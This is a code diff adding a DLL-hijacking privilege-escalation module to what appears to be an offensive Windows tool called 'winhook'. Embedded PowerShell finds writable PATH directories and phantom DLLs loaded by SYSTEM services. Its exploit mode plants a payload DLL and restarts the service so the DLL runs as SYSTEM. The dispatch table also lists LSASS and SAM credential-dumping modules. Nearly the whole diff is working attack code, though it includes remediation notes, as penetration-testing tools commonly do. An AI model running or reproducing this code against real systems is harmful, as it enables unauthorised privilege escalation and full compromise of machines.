@@ -450,6 +450,10 @@ server_operator_abuse: {
     description: "Abuse Server Operators group membership for privilege escalation to SYSTEM — Server Operators can start/stop services and modify service configurations on Domain Controllers. Modify an existing service's binary path to execute arbitrary commands as SYSTEM",
     args: "--action check|exploit [--service SERVICE_NAME] [--payload CMD]",
   },
+dll_hijack: {
+    description: "DLL hijacking for privilege escalation — enumerate writable directories in system PATH, scan for known DLL hijack targets (StorSvc/SprintCSP.dll, CDPSvc/cdpsgshims.dll, DiagHub/diagtrack.dll, USO/windowscoredeviceinfo.dll, IKEEXT/wlbsctrl.dll, NetMan/wlanhlp.dll, SessionEnv/TSMSISrv.dll), check missing DLLs loaded by SYSTEM services, and optionally place a DLL payload",
+    args: "--action enum|exploit [--target SERVICE_NAME] [--dll DLL_PATH]",
+  },
 } as const satisfies Record<string, { description: string; args: string }>
 
 type Program = keyof typeof PROGRAMS
@@ -16102,6 +16106,210 @@ Write-Output "    Command executed: ${payload}"
   return { output: output.join("\n"), findings }
 }
 
+async function dllHijack(args: string[], timeout: number): Promise<HookResult> {
+  const action = argVal(args, "--action") || "enum"
+  const target = argVal(args, "--target")
+  const dll = argVal(args, "--dll")
+  const findings: Finding[] = []
+  const output: string[] = ["[*] DLL Hijacking analysis...\n"]
+
+  if (action === "enum") {
+    const script = `
+# ── Part 1: Writable directories in system PATH ──
+Write-Output "=== Writable PATH Directories ===`n"
+
+$pathDirs = $env:PATH -split ';' | Where-Object { $_ -and (Test-Path $_) } | Sort-Object -Unique
+$writablePaths = @()
+
+foreach ($dir in $pathDirs) {
+    try {
+        $testFile = Join-Path $dir ".cs_dll_test_$([guid]::NewGuid().ToString('N').Substring(0,6))"
+        [System.IO.File]::Create($testFile).Close()
+        Remove-Item $testFile -Force
+        $writablePaths += $dir
+        Write-Output "  [WRITABLE] $dir"
+    } catch {
+        # not writable
+    }
+}
+
+if ($writablePaths.Count -eq 0) {
+    Write-Output "  [-] No writable PATH directories found"
+}
+
+# ── Part 2: Known DLL hijack targets ──
+Write-Output ""
+Write-Output "=== Known DLL Hijack Targets ===`n"
+
+$knownHijacks = @(
+    @{ Service = "StorSvc"; DLL = "SprintCSP.dll"; Desc = "Storage Service — loads from PATH, runs as SYSTEM" },
+    @{ Service = "CDPSvc"; DLL = "cdpsgshims.dll"; Desc = "Connected Devices Platform — missing DLL loaded at startup" },
+    @{ Service = "DiagTrack"; DLL = "diagtrack_win.dll"; Desc = "Diagnostics Tracking — phantom DLL load" },
+    @{ Service = "UsoSvc"; DLL = "windowscoredeviceinfo.dll"; Desc = "Update Orchestrator — DLL search order hijack" },
+    @{ Service = "IKEEXT"; DLL = "wlbsctrl.dll"; Desc = "IKE/AuthIP — classic missing DLL (Win7-10)" },
+    @{ Service = "NetMan"; DLL = "wlanhlp.dll"; Desc = "Network Connections — missing wireless DLL on wired-only systems" },
+    @{ Service = "SessionEnv"; DLL = "TSMSISrv.dll"; Desc = "Remote Desktop Configuration — missing DLL if RDS not installed" },
+    @{ Service = "Fax"; DLL = "FXSSVC.dll"; Desc = "Fax Service — writable by Users in some configs" },
+    @{ Service = "seclogon"; DLL = "slui.dll"; Desc = "Secondary Logon — search order confusion" },
+    @{ Service = "SensorService"; DLL = "SensorPerformanceEvents.dll"; Desc = "Sensor Monitoring — optional DLL" }
+)
+
+foreach ($h in $knownHijacks) {
+    $svc = Get-Service $h.Service -ErrorAction SilentlyContinue
+    $status = if ($svc) { $svc.Status } else { "NOT_INSTALLED" }
+    $startType = if ($svc) {
+        try { (Get-CimInstance Win32_Service -Filter "Name='$($h.Service)'" -ErrorAction SilentlyContinue).StartMode } catch { "Unknown" }
+    } else { "N/A" }
+
+    # Check if the DLL already exists in System32
+    $dllExists = Test-Path "$env:SystemRoot\\System32\\$($h.DLL)" -ErrorAction SilentlyContinue
+
+    # Check if any writable PATH dir could host this DLL
+    $canHijack = $false
+    $hijackPath = ""
+    if (-not $dllExists) {
+        foreach ($wp in $writablePaths) {
+            $canHijack = $true
+            $hijackPath = Join-Path $wp $h.DLL
+            break
+        }
+    }
+
+    $indicator = if ($canHijack) { "[EXPLOITABLE]" } elseif (-not $dllExists) { "[DLL MISSING]" } else { "[DLL EXISTS]" }
+    Write-Output "  $indicator $($h.Service) -> $($h.DLL)"
+    Write-Output "      Status: $status | Start: $startType"
+    Write-Output "      $($h.Desc)"
+    if ($canHijack) { Write-Output "      Target: $hijackPath" }
+    Write-Output ""
+}
+
+# ── Part 3: Service binary directory permissions ──
+Write-Output "=== SYSTEM Services with Writable Binary Directories ===`n"
+
+$systemServices = Get-CimInstance Win32_Service -ErrorAction SilentlyContinue | Where-Object {
+    $_.StartName -match 'LocalSystem|SYSTEM' -and $_.PathName
+}
+
+$writableSvcDirs = @()
+foreach ($svc in $systemServices) {
+    $binPath = $svc.PathName
+    if ($binPath -match '^"([^"]+)"') { $exePath = $Matches[1] }
+    elseif ($binPath -match '^(\S+\\.exe)') { $exePath = $Matches[1] }
+    else { continue }
+
+    $dir = Split-Path $exePath -Parent -ErrorAction SilentlyContinue
+    if (-not $dir -or -not (Test-Path $dir) -or $dir -match 'System32|SysWOW64') { continue }
+
+    try {
+        $testFile = Join-Path $dir ".cs_svc_test"
+        [System.IO.File]::Create($testFile).Close()
+        Remove-Item $testFile -Force
+        $writableSvcDirs += [PSCustomObject]@{ Name = $svc.Name; Dir = $dir; Path = $svc.PathName }
+        Write-Output "  [WRITABLE] $($svc.Name) -> $dir"
+    } catch {}
+}
+
+if ($writableSvcDirs.Count -eq 0) {
+    Write-Output "  [-] No writable SYSTEM service directories found"
+}
+`
+    const result = await ps(script, timeout)
+    output.push(result.stdout)
+
+    const exploitableCount = (result.stdout.match(/\[EXPLOITABLE\]/g) || []).length
+    const writablePathCount = (result.stdout.match(/\[WRITABLE\]/g) || []).length
+
+    if (exploitableCount > 0 || writablePathCount > 0) {
+      findings.push({
+        checkId: "WIN-PRIVESC-DLL-001",
+        provider: "windows",
+        severity: exploitableCount > 0 ? "critical" : "high",
+        status: exploitableCount > 0 ? "VULNERABLE" : "ENUMERATED",
+        resource: "dll://hijack-targets",
+        title: `${exploitableCount} exploitable DLL hijack(s), ${writablePathCount} writable location(s)`,
+        details: result.stdout.substring(0, 500),
+        remediation: "Remove write permissions from PATH directories. Install missing DLLs. Use DLL redirection or SafeDllSearchMode.",
+      })
+    }
+  } else if (action === "exploit") {
+    if (!target) return { output: "[!] Required: --target SERVICE_NAME --dll DLL_PATH", findings }
+    if (!dll) return { output: "[!] Required: --dll DLL_PATH (path to your payload DLL)", findings }
+
+    const script = `
+Write-Output "[*] DLL hijack exploit for service: ${target}"
+
+# Find where to place the DLL
+$pathDirs = $env:PATH -split ';' | Where-Object { $_ -and (Test-Path $_) }
+$targetDir = $null
+
+foreach ($dir in $pathDirs) {
+    try {
+        $testFile = Join-Path $dir ".cs_hijack_test"
+        [System.IO.File]::Create($testFile).Close()
+        Remove-Item $testFile -Force
+        $targetDir = $dir
+        break
+    } catch {}
+}
+
+if (-not $targetDir) {
+    Write-Output "[-] No writable PATH directory found"
+    exit 1
+}
+
+# Determine the expected DLL name for this service
+$knownDlls = @{
+    'StorSvc' = 'SprintCSP.dll'
+    'CDPSvc' = 'cdpsgshims.dll'
+    'DiagTrack' = 'diagtrack_win.dll'
+    'UsoSvc' = 'windowscoredeviceinfo.dll'
+    'IKEEXT' = 'wlbsctrl.dll'
+    'NetMan' = 'wlanhlp.dll'
+    'SessionEnv' = 'TSMSISrv.dll'
+}
+
+$dllName = $knownDlls['${target}']
+if (-not $dllName) {
+    Write-Output "[-] Unknown service '${target}' — provide the expected DLL name manually"
+    exit 1
+}
+
+$destPath = Join-Path $targetDir $dllName
+Write-Output "[*] Placing DLL: ${dll} -> $destPath"
+Copy-Item "${dll}" $destPath -Force
+Write-Output "[+] DLL placed: $destPath"
+
+# Trigger the service
+Write-Output "[*] Restarting service ${target}..."
+try {
+    Restart-Service ${target} -Force -ErrorAction Stop
+    Write-Output "[+] Service restarted — DLL should be loaded"
+} catch {
+    Write-Output "[!] Could not restart service: use 'sc start ${target}' or wait for reboot"
+}
+
+Write-Output "[!] Cleanup: Remove-Item '$destPath'"
+`
+    const result = await ps(script, timeout)
+    output.push(result.stdout)
+
+    if (result.stdout.includes("DLL placed")) {
+      findings.push({
+        checkId: "WIN-PRIVESC-DLL-002",
+        provider: "windows",
+        severity: "critical",
+        status: "EXPLOITED",
+        resource: `service://${target}`,
+        title: `DLL hijack exploited: ${target}`,
+        details: `Payload DLL placed in writable PATH directory. Service restart triggers execution as SYSTEM.`,
+        remediation: "Remove planted DLL, fix PATH directory permissions, install the legitimate DLL.",
+      })
+    }
+  }
+
+  return { output: output.join("\n"), findings }
+}
+
 const dispatch: Record<Program, (args: string[], timeout: number) => Promise<HookResult>> = {
   lsass_dump: lsassDump,
   sam_dump: samDump,
@@ -16195,6 +16403,7 @@ const dispatch: Record<Program, (args: string[], timeout: number) => Promise<Hoo
   weak_service_perms: weakServicePerms,
   dll_sideload: dllSideload,
   server_operator_abuse: serverOperatorAbuse,
+  dll_hijack: dllHijack,
 }
 
 export const WinhookTool = Tool.define("winhook", {
